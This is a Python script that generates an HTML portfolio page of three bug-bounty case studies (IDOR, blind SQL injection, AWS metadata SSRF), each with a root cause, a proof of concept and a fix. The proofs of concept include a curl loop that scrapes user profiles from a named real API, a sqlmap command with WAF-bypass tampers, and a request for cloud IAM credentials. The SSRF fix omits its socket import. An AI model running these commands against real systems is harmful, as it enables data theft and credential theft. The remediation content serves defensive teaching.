import os

file_path = r"d:\abdo_portfolio\main\static\main\modules\mod_assess_bugbounty.html"

html = """
<div class="meth-content-view" id="meth-content-assess-bb" style="display: none; --tool-color: #ff0055;" dir="rtl">
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">🐛</span> Real-World Bug Bounty Cases</h2>
    <p class="hero-tagline">تحليل لثغرات حقيقية تم اكتشافها واستغلالها مع التركيز على الأسباب الجذرية وطرق الحماية (Remediation).</p>
  </div>
  
  <style>
    details {
        background: rgba(0,0,0,0.3);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        margin-bottom: 15px;
        padding: 10px 15px;
        color: var(--text-primary);
    }
    summary {
        font-weight: bold;
        font-size: 1.1em;
        cursor: pointer;
        outline: none;
        padding: 5px 0;
        display: flex;
        align-items: center;
    }
    summary::after {
        content: '+';
        margin-right: auto;
        font-size: 1.2em;
        color: var(--tool-color);
    }
    details[open] summary::after {
        content: '-';
    }
    .case-section {
        margin-top: 15px;
        padding-top: 15px;
        border-top: 1px dashed rgba(255,255,255,0.1);
    }
  </style>

  <!-- Case 1: Starbucks IDOR -->
  <div class="cyber-card">
    <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
        <h3 style="margin: 0; color: #ff5555;">☕ Case 1: Starbucks API IDOR</h3>
        <span style="background: #ff555522; color: #ff5555; padding: 5px 10px; border-radius: 4px; font-weight: bold;">Bounty: $2,000</span>
    </div>
    <p style="color: var(--text-secondary); margin-bottom: 20px;">استيلاء على حسابات المستخدمين (Account Takeover) من خلال ثغرة Insecure Direct Object Reference.</p>

    <details>
      <summary>🔍 ROOT CAUSE ANALYSIS</summary>
      <div class="case-section">
        <ul style="line-height: 1.8;">
            <li><strong>Vulnerable Endpoint:</strong> <code>/api/profile/{user_id}</code></li>
            <li><strong>Missing Validation:</strong> لا يوجد تحقق (Authorization Check) إذا كان الرمز المميز (Token) ينتمي فعلياً للـ <code>user_id</code> المطلوب.</li>
            <li><strong>Code Smell:</strong> استعلام قاعدة البيانات يتم مباشرة عبر الـ ID الممرر من المستخدم بدون التحقق من الجلسة (Session).</li>
        </ul>
      </div>
    </details>

    <details>
      <summary>💥 EXPLOITATION CODE (PoC)</summary>
      <div class="case-section">
        <p>استغلال الثغرة لسرقة بيانات 1000 مستخدم برمجياً (Mass Data Exfiltration):</p>
        <div class="cmd-ui-box">
for i in {1..1000}; do
  curl "https://api.starbucks.com/profile?id=$i" \
  -H "Authorization: Bearer $MY_VALID_TOKEN" \
  -o "user_$i.json"
done
        </div>
      </div>
    </details>

    <details>
      <summary>✅ REMEDIATION CODE (Fix)</summary>
      <div class="case-section">
        <p>الحل الآمن (Secure Implementation) في الباك إند (Python/Flask example):</p>
        <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>def get_user_profile(user_id, current_user):
    # Authorization Check: Is the requested ID the same as the logged-in user?
    if user_id != current_user.id:
        raise PermissionError("Access Denied: You cannot view other users' profiles.")
        
    return db.query(User).filter_by(id=user_id).first()</code></pre>
      </div>
    </details>
  </div>

  <!-- Case 2: SQLi in Auth -->
  <div class="cyber-card">
    <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
        <h3 style="margin: 0; color: #50fa7b;">💉 Case 2: Blind SQLi in Login Form</h3>
        <span style="background: #50fa7b22; color: #50fa7b; padding: 5px 10px; border-radius: 4px; font-weight: bold;">Bounty: $4,500</span>
    </div>
    <p style="color: var(--text-secondary); margin-bottom: 20px;">تجاوز تسجيل الدخول والوصول لصلاحيات المسؤول عبر Time-based Blind SQL Injection.</p>

    <details>
      <summary>🔍 ROOT CAUSE ANALYSIS</summary>
      <div class="case-section">
        <ul style="line-height: 1.8;">
            <li><strong>Vulnerable Endpoint:</strong> <code>POST /api/v1/auth/login</code> (في حقل Username).</li>
            <li><strong>Missing Validation:</strong> عدم استخدام استعلامات محُضّرة (Parameterized Queries) وتمرير المُدخل مباشرة لمحرك الـ MySQL.</li>
            <li><strong>WAF Bypass:</strong> نظام الحماية (WAF) كان يحظر الكلمات المفتاحية مثل `SLEEP` ولكنه لم يحظر `BENCHMARK`.</li>
        </ul>
      </div>
    </details>

    <details>
      <summary>💥 EXPLOITATION CODE (PoC)</summary>
      <div class="case-section">
        <p>استغلال الثغرة باستخدام أداة SQLMap مع تخطي الـ WAF بـ Tamper scripts:</p>
        <div class="cmd-ui-box">
sqlmap -u "https://target.com/api/v1/auth/login" --data="username=admin&password=123" \
--level=5 --risk=3 --dbms=mysql --tamper=between,charencode \
--technique=T --time-sec=5 --dbs
        </div>
      </div>
    </details>

    <details>
      <summary>✅ REMEDIATION CODE (Fix)</summary>
      <div class="case-section">
        <p>استخدام Prepared Statements (مثال بـ Node.js/Express):</p>
        <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>// ❌ BAD (Vulnerable):
const query = `SELECT * FROM users WHERE username = '${req.body.username}'`;
db.execute(query);

// ✅ GOOD (Secure):
const query = `SELECT * FROM users WHERE username = ?`;
const values = [req.body.username];
db.execute(query, values);</code></pre>
      </div>
    </details>
  </div>

  <!-- Case 3: SSRF -->
  <div class="cyber-card">
    <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
        <h3 style="margin: 0; color: #bd93f9;">☁️ Case 3: AWS Metadata SSRF</h3>
        <span style="background: #bd93f922; color: #bd93f9; padding: 5px 10px; border-radius: 4px; font-weight: bold;">Bounty: $10,000</span>
    </div>
    <p style="color: var(--text-secondary); margin-bottom: 20px;">ثغرة SSRF في خاصية "Image Export" أدت لسحب بيانات الـ AWS IAM Role المؤقتة للخادم.</p>

    <details>
      <summary>🔍 ROOT CAUSE ANALYSIS</summary>
      <div class="case-section">
        <ul style="line-height: 1.8;">
            <li><strong>Vulnerable Endpoint:</strong> <code>/export?url=https://image.com/1.png</code></li>
            <li><strong>Missing Validation:</strong> السيرفر يقوم بتحميل أي رابط يمرر له دون استخدام قائمة بيضاء (Whitelist) للمسارات المسموحة، ودون حظر عناوين الشبكة الداخلية (Localhost/169.254.x.x).</li>
            <li><strong>Impact:</strong> تسريب AWS Access Keys للمخترق.</li>
        </ul>
      </div>
    </details>

    <details>
      <summary>💥 EXPLOITATION CODE (PoC)</summary>
      <div class="case-section">
        <p>الوصول إلى AWS Metadata Endpoint للحصول على مفاتيح الصلاحيات:</p>
        <div class="cmd-ui-box">
curl "https://target.com/export?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role"
        </div>
      </div>
    </details>

    <details>
      <summary>✅ REMEDIATION CODE (Fix)</summary>
      <div class="case-section">
        <p>فلترة الـ URLs ومنع الاتصال بالعناوين الداخلية (SSRF Mitigation):</p>
        <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>import ipaddress
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)
    
    # Block internal, private, and loopback IPs
    if ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback:
        return False
        
    # Block AWS metadata IP explicitly
    if ip == '169.254.169.254':
        return False
        
    return True</code></pre>
      </div>
    </details>
  </div>

</div>
"""

with open(file_path, "w", encoding="utf-8") as f:
    f.write(html)
print("Updated mod_assess_bugbounty.html with 3 Real Writeups")
